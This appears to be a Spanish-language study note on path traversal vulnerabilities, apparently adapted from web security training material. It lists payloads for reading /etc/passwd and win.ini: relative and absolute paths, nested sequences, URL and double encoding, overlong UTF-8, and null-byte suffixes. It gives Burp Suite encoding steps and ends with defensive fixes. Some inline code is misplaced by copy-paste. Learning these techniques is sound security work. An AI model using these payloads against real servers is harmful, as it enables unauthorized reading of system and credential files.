
Es la vulnerabilidad que se da cuando podemos, directamente sobre la URL viajar a carpetas del servidor y sacar información ilegítima.

Imagina una aplicación de compras que muestra imágenes de artículos a la venta. Esto puede cargar una imagen usando el siguiente HTML:

```
<img src="/loadImage?filename=218.png">
```

La URL toma un parámetro y devuelve el contenido del archivo especificado. Los archivos de imagen se almacenan en el disco en la ubicación . Para devolver una imagen, la aplicación añade el nombre de archivo solicitado a este directorio base y utiliza una API del sistema de archivos para leer el contenido del archivo. En otras palabras, la aplicación lee desde la siguiente ruta de archivo: `loadImage``filename``/var/www/images/`

```
/var/www/images/218.png
```

Esta aplicación no implementa defensas contra ataques de recorrido de camino. Como resultado, un atacante puede solicitar la siguiente URL para recuperar el archivo del sistema de archivos del servidor: `/etc/passwd`

```
https://insecure-website.com/loadImage?filename=../../../etc/passwd
```

Esto hace que la aplicación lea desde la siguiente ruta de archivo:

```
/var/www/images/../../../etc/passwd
```

**En Windows, tanto como son secuencias válidas de recorrido de directorios. A continuación se muestra un ejemplo de un ataque equivalente contra un servidor basado en Windows: `../``..\`**

```
https://insecure-website.com/loadImage?filename=..\..\..\windows\win.ini
```

A veces, hay equipos que limitan el uso de ../, con lo que podemos llamar directamente a la ruta absoluta tal que

```
/var/www/images/filename=/etc/passwd
```

al poner **/** antes de **etc** vamos directamente al root

Podrías usar secuencias de recorrido anidadas, como o . Estas vuelven a secuencias de recorrido simples cuando se elimina la secuencia interna.`....//``....\/`, esto se usa porque los sistemas que buscan ../ y lo eliminan, nos dan la ruta relativa

```
..../..../

..(../)/..(../)/

../../
```

Luego se puede codificar tal que 

- `.` en código URL es `%2e`
- `/` en código URL es `%2f`
- **Tu ataque:** `%2e%2e%2f` es lo mismo que `../`

O incluso

- El `%` se codifica como `%25`.
- **Tu ataque:** `%252e%252e%252f`

### **¿Qué es la forma "larga"?**

En el estándar Unicode, un carácter como la barra `/` se puede representar de varias maneras. La normal es un solo byte, pero existen formas "sobre-codificadas" (overlong UTF-8) que usan dos o más bytes para decir lo mismo.

- **La barra normal:** `/`
- **La barra "rara":** `%c0%af`


### **¿Cómo usar esto en Burp Suite?**

Si estás en el **Repeater** y el ataque normal no funciona, no tienes que escribir estos códigos a mano. Burp tiene una herramienta para esto:

1. Escribe tu payload normal: `../../../etc/passwd`.
2. Sombrea con el ratón la parte de los puntos y barras (`../../../`).
3. Haz **clic derecho** -> **Convert selection** -> **URL** -> **URL-encode all characters** (o presiona `Ctrl + U`).
4. Si quieres probar la doble, vuelve a sombrear el resultado y dale a `Ctrl + U` otra vez.

Hay casos donde te sale directamente la ruta

```
/var/www/image/../../../etc/passwd
```

Y otras donde buscan que acabe en .png por ejemplo, con lo que usamos un **Null Byte** donde engañamos al sistema usando **%00** que al sistema le estamos diciendo que nada de lo que venga después cuenta

```
/var/ww/image/../../../etc/passwd%00.png
```

# SOLUCIÓN

No permitir que los usuarios introduzcan las imagenes y archivos de esa manera, se puede usar IDs como `getPhoto?id=123` que el programa sabe que hace referencia a `/images/perfil.png` inutilizando el ataque, o también metiendo validaciones en el propio código Java como

```
File file = new File(BASE_DIRECTORY, userInput); 
if (file.getCanonicalPath().startsWith(BASE_DIRECTORY)) {
 // process file 
}
```